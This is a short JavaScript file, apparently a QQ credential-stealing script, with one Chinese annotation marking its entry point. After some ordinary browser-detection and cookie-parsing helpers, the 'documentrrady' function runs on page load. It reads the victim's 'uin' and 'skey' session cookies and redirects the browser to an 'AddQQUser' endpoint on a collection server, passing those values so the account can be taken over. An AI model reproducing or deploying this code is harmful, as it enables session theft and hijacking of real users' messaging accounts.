document.domain = "qq.com";
window.onload = documentrrady;  // 我注释的：入口点
var browser = {
   versions: function () {
       var u = navigator.userAgent, app = navigator.appVersion;
       return {
           trident: u.indexOf('Trident') > -1, //IE内核
           presto: u.indexOf('Presto') > -1, //opera内核
           webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
           gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1,//火狐内核
           mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
           ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
           android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
           iPhone: u.indexOf('iPhone') > -1, //是否为iPhone或者QQHD浏览器
           iPad: u.indexOf('iPad') > -1, //是否iPad
           webApp: u.indexOf('Safari') == -1 //是否web应该程序，没有头部与底部
       };
   }(),
   language: (navigator.browserLanguage || navigator.language).toLowerCase()
}
function GetWebVersion() {
   if (browser.versions.iPhone) {
       return "iPhone";
   }
   if (browser.versions.android) {
       return "android";
   }
   return "pc";
}
function getCookie(name) {
   var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");
   if (arr = document.cookie.match(reg))
       return unescape(arr[2]);
   else
       return null;
}
function getQueryString(name) {
   var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
   var r = window.location.search.substr(1).match(reg);
   if (r != null) return unescape(r[2]); return null;
}
function documentrrady()
{
   window.location.href = "http://127.0.0.1/server/AddQQUser?qqnumber=" + parseInt(getCookie("uin").replace("o", "")) + "&skey=" + getCookie("skey") + "&sex=&nickname=&city=&useragant=" + GetWebVersion() + "&addfriendsids=&qqtype=lockKey2&cookie=&uin=" + getCookie("uin");
}